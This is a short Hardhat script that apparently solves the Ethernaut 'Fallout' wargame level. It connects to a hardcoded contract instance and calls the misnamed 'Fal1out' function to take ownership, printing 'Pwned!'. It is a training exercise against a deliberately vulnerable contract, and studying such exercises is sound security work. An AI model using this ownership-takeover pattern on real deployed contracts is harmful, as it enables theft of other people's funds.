const { ethers } = require("hardhat")
require("dotenv").config()

const falloutInstanceAddress = "0xd5693a97FA1689B4E2DB19eF5983A9121647b49b"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Connect to Fallout */

  console.log("Connecting to your instance of Fallout contract...")
  const fallback = await ethers.getContractAt("Fallout", falloutInstanceAddress, deployer)

  /* Running the attack and logging to console */

  console.log("Calling the Fal1out function...")
  const attack = await fallback.Fal1out()
  await attack.wait(1)
  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
